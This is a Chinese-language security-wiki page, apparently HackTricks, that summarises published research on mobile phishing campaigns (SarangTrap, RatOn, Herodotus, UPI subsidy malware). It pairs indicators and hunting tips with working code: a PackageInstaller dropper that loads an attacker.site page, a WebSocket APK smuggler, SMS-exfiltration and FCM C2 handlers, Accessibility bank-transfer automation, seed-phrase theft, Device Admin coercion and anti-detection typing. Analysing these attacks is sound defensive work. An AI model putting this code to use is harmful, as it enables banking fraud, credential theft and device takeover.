# 移动钓鱼与恶意应用分发（Android 与 iOS）

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 本页涵盖威胁行为者通过钓鱼（SEO、social engineering、假商店、约会应用等）分发**malicious Android APKs**和**iOS mobile-configuration profiles**的技术。
> 材料改编自 Zimperium zLabs（2025）曝光的 SarangTrap 活动及其他公开研究。

## 攻击流程

1. **SEO/Phishing Infrastructure**
* 注册大量相似域名（约会、云分享、汽车服务……）。
– 在 `<title>` 元素中使用本地语言关键词和表情符号以提高 Google 排名。
– 在同一着陆页上同时托管 Android（`.apk`）和 iOS 安装说明。
2. **First Stage Download**
* Android：指向未签名或“third-party store” APK 的直接链接。
* iOS：`itms-services://` 或普通 HTTPS 链接到恶意 **mobileconfig** 配置文件（见下文）。
3. **Post-install Social Engineering**
* 首次运行时，应用要求输入 **invitation / verification code**（营造专属访问的假象）。
* 该代码通过 HTTP POST 发送到 Command-and-Control (C2)。
* C2 回复 `{"success":true}` ➜ 恶意程序继续执行。
* 从未提交有效代码的沙箱/AV 动态分析不会看到恶意行为（规避）。
4. **Runtime Permission Abuse** (Android)
* 危险权限仅在收到 C2 的正面响应后请求：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 近期变体**从 `AndroidManifest.xml` 中移除 SMS 的 `<uses-permission>`**，但保留通过反射读取 SMS 的 Java/Kotlin 代码路径 ⇒ 降低静态评分，同时在通过 `AppOps` 滥用或旧目标授予权限的设备上仍可工作。

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 为 sideloaded apps 引入了 **Restricted settings**：Accessibility 和 Notification Listener 切换在用户未在 **App info** 明确允许 restricted settings 前会被置灰。
* 钓鱼页面和 droppers 现在提供逐步 UI 指令，指导用户为 sideloaded app **允许 restricted settings**，然后启用 Accessibility/Notification 访问。
* 更新的绕过方法是通过 **session‑based PackageInstaller flow**（与应用商店相同的方法）安装负载。Android 会将应用视为 store‑installed，因此 Restricted settings 不再阻止 Accessibility。
* 筛查提示：在 dropper 中，grep `PackageInstaller.createSession/openSession` 以及立即导航受害者到 `ACTION_ACCESSIBILITY_SETTINGS` 或 `ACTION_NOTIFICATION_LISTENER_SETTINGS` 的代码。

6. **Facade UI & Background Collection**
* 应用显示无害界面（SMS 查看器、图库选择器），这些界面在本地实现。
* 同时它会外泄：
- IMEI / IMSI, 手机号码
- 完整的 `ContactsContract` 导出（JSON 数组）
- 来自 `/sdcard/DCIM` 的 JPEG/PNG，使用 [Luban](https://github.com/Curzibn/Luban) 压缩以减小体积
- 可选的 SMS 内容（`content://sms`）
负载被**批量压缩为 zip**并通过 `HTTP POST /upload.php` 发送。
7. **iOS Delivery Technique**
* 单个 **mobile-configuration profile** 可以请求 `PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` 等，将设备注册为类似 “MDM” 的管理状态。
* 社会工程指令：
1. 打开 Settings ➜ *Profile downloaded*。
2. 点击 *Install* 三次（钓鱼页上有截图）。
3. 信任未签名的配置文件 ➜ 攻击者在无需 App Store 审核的情况下获得 *Contacts* 与 *Photo* 权限。
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads 可以**将钓鱼 URL 固定到主屏幕**，带有品牌图标/标签。
* Web Clips 可运行**全屏**（隐藏浏览器 UI），并可被标记为**不可移除**，受害者必须删除配置文件才能移除图标。
9. **Network Layer**
* 明文 HTTP，通常在端口 80，HOST 头类似 `api.<phishingdomain>.com`。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（无 TLS → 易被发现）。

## Red-Team Tips

* **Dynamic Analysis Bypass** – 在恶意软件评估时，使用 Frida/Objection 自动化 invitation code 阶段以进入恶意分支。
* **Manifest vs. Runtime Diff** – 比较 `aapt dump permissions` 与运行时的 `PackageManager#getRequestedPermissions()`；危险权限缺失是一个红旗。
* **Network Canary** – 配置 `iptables -p tcp --dport 80 -j NFQUEUE` 以检测代码输入后异常的 POST 爆发。
* **mobileconfig Inspection** – 在 macOS 上使用 `security cms -D -i profile.mobileconfig` 列出 `PayloadContent` 并发现过度的权限。

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## 指标（通用）
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

这种模式在滥用政府补贴主题的活动中被观察到，用于窃取印度 UPI 凭证和 OTPs。运营者将信誉良好的平台串联起来以实现投放和提高抗打击能力。

### Delivery chain across trusted platforms
- YouTube 视频诱饵 → 描述包含短链接
- 短链接 → GitHub Pages 钓鱼站，模仿合法门户
- 同一 GitHub 仓库托管了一个 APK，并用假的 “Google Play” 徽章直接链接到该文件
- 动态钓鱼页面托管在 Replit；远程命令通道使用 Firebase Cloud Messaging (FCM)

### Dropper 带嵌入载荷和离线安装
- 第一个 APK 是一个安装器 (dropper)，它在 `assets/app.apk` 中携带真实的恶意软件，并提示用户关闭 Wi‑Fi/移动数据以削弱云端检测。
- 嵌入的载荷以无害的标签安装（例如，“Secure Update”）。安装后，安装器和载荷作为两个独立的应用存在。

静态排查提示（使用 grep 查找嵌入的载荷）：
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### 通过短链接进行动态端点发现
- Malware 从短链接获取一个纯文本、以逗号分隔的活动端点列表；简单的字符串变换生成最终的 phishing 页面路径。

示例（已脱敏）：
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
伪代码:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” 步骤在 WebView 内从动态端点加载攻击者 HTML 表单并捕获敏感字段（手机号、银行、UPI PIN），这些字段通过 `POST` 发送到 `addup.php`。

最小加载器：
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- 在首次运行时会请求过多权限：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 联系人被循环以从受害者设备群发 smishing SMS。
- 收到的 SMS 会被 broadcast receiver 截获，并连同元数据（sender、body、SIM slot、per-device random ID）上传到 `/addsm.php`。

接收器草图：
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) 作为弹性的 C2
- payload 向 FCM 注册；推送消息携带一个 `_type` 字段，用作触发操作的开关（例如：更新 phishing 文本模板、切换行为）。

示例 FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler 草图:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### 指标/IOCs
- APK 在 `assets/app.apk` 包含次级 payload
- WebView 从 `gate.htm` 加载 payment 并 exfiltrates 到 `/addup.php`
- SMS exfiltration 到 `/addsm.php`
- 通过短链接驱动的配置抓取（例如 `rebrand.ly/*`），返回 CSV 端点
- 应用标记为通用 “Update/Secure Update”
- 在不受信任的应用中，FCM `data` 消息带有 `_type` 判别器

---

## 基于 Socket.IO/WebSocket 的 APK 走私 + 假冒 Google Play 页面

攻击者越来越多地用嵌入在类 Google Play 诱饵中的 Socket.IO/WebSocket 通道替换静态 APK 链接。这可以隐藏 payload URL、绕过 URL/扩展名 过滤器，并保留真实的安装 UX。

实战中观察到的典型客户端流程：

<details>
<summary>Socket.IO 假冒 Play 下载器 (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

为何能规避简单防护：
- 未暴露静态 APK URL；payload 从 WebSocket frames 在内存中重建。
- 阻止直接 .apk 响应的 URL/MIME/extension filters 可能会漏掉通过 WebSockets/Socket.IO 隧道传输的 binary data。
- 不执行 WebSockets 的 crawlers 和 URL sandboxes 无法检索到 payload。

另见 WebSocket 相关战术与工具：

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

RatOn banker/RAT campaign (ThreatFabric) 是一个具体示例，说明现代 mobile phishing operations 如何融合 WebView droppers、Accessibility-driven UI automation、overlays/ransom、Device Admin coercion、Automated Transfer System (ATS)、crypto wallet takeover，甚至 NFC-relay orchestration。本节抽象出可复用的技术。

### Stage-1: WebView → native install bridge (dropper)
攻击者展示一个指向攻击者页面的 WebView，并注入一个暴露 native installer 的 JavaScript 接口。点击 HTML 按钮会调用 native 代码，安装捆绑在 dropper 的 assets 中的 second-stage APK，然后直接启动它。

最小模式：

<details>
<summary>Stage-1 dropper 最小模式 (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

页面上的 HTML：
```html
<button onclick="bridge.installApk()">Install</button>
```
安装后，dropper 通过显式的 package/activity 启动 payload：
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
狩猎思路：不受信任的应用调用 `addJavascriptInterface()` 并向 WebView 暴露类似安装器的方法；APK 在 `assets/` 下携带嵌入的二次有效载荷并调用 Package Installer Session API。

### 同意流程：Accessibility + Device Admin + 后续运行时提示
第2阶段会打开一个承载 “Access” 页面 的 WebView。该页面的按钮调用一个 exported method，将受害者导航到 Accessibility 设置并请求启用该恶意服务。一旦被授予，malware 会使用 Accessibility 在后续的运行时权限对话框（contacts、overlay、manage system settings 等）中自动点击，并请求 Device Admin。

- Accessibility 通过在节点树（node-tree）中查找类似 “Allow”/“OK” 的按钮并派发点击，从而以编程方式帮助接受后续提示。
- Overlay 权限检查/请求：
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
操作者可以发出命令以：
- 从 URL 渲染全屏 overlay，或
- 传入内联 HTML 并将其加载到 WebView overlay 中。

可能用途：胁迫（输入 PIN）、打开钱包以捕获 PIN、勒索消息。保留一个命令以在缺少时确保 overlay 权限已被授予。

### Remote control model – text pseudo-screen + screen-cast
- 低带宽：定期 dump Accessibility node tree，序列化可见文本/roles/边界并作为伪屏幕发送到 C2（如 `txt_screen` 一次性，`screen_live` 连续）。
- 高保真：请求 MediaProjection 并按需开始屏幕投射/录制（如 `display` / `record` 命令）。

### ATS playbook (bank app automation)
给定一个 JSON 任务，打开银行应用，通过 Accessibility 驱动 UI，混合使用文本查询和坐标点击，并在提示时输入受害者的支付 PIN。

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "新付款"
- "Zadat platbu" → "输入付款"
- "Nový příjemce" → "新收款人"
- "Domácí číslo účtu" → "国内账户号码"
- "Další" → "下一步"
- "Odeslat" → "发送"
- "Ano, pokračovat" → "是，继续"
- "Zaplatit" → "支付"
- "Hotovo" → "完成"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Immediate lock:
```java
dpm.lockNow();
```
- 使当前凭证过期以强制更改（Accessibility 捕获新的 PIN/密码）:
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- 强制非生物识别解锁：通过禁用 keyguard 的生物识别功能：
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
注意：许多 DevicePolicyManager 控件在较新的 Android 上要求 Device Owner/Profile Owner；某些 OEM 构建可能宽松。始终在目标 OS/OEM 上验证。

### NFC 中继编排 (NFSkate)
Stage-3 可以安装并启动外部 NFC 中继模块（例如 NFSkate），甚至向其传递一个 HTML 模板以在中继过程中引导受害者。这使得无接触的现场刷卡现金套现与在线 ATS 并行成为可能。

背景: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### 操作员命令集（示例）
- UI/状态: `txt_screen`, `screen_live`, `display`, `record`
- 社交: `send_push`, `Facebook`, `WhatsApp`
- 覆盖层: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- 钱包: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- 设备: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- 通信/侦察: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility 驱动的 ATS 反检测：类人文本节奏与双重文本注入 (Herodotus)

威胁行为者越来越多地将 Accessibility 驱动的自动化与针对基本行为生物特征的反检测技术相结合。最近的 banker/RAT 展示了两种互补的文本传递模式和一个操作员开关，用于通过随机节奏模拟人工打字。

- 发现模式：在操作之前枚举可见节点并使用选择器和 bounds 精确定位输入（ID、text、contentDescription、hint、bounds）。
- 双重文本注入：
  - 模式 1 – `ACTION_SET_TEXT` 直接作用于目标节点（稳定，无键盘）；
  - 模式 2 – 将内容放入剪贴板然后对聚焦节点执行 `ACTION_PASTE`（当直接 setText 被阻止时有效）。
- 类人节奏：将操作员提供的字符串拆分并逐字符发送，在事件之间使用随机 300–3000 ms 延迟以规避“machine-speed typing” 启发式。可通过逐步增长值（使用 `ACTION_SET_TEXT`），或逐字符粘贴实现。

<details>
<summary>Java 草图：节点发现 + 通过 setText 或 clipboard+paste 的延迟逐字符输入</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

用于欺诈掩护的屏蔽覆盖层：
- 渲染一个全屏 `TYPE_ACCESSIBILITY_OVERLAY`，由操作者控制不透明度；对受害者保持不透明，同时远程自动化在其下方运行。
- 通常暴露的命令： `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

可调透明度的最小覆盖层：
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
常见的操作控制原语： `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (屏幕共享)。

## 参考资料

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
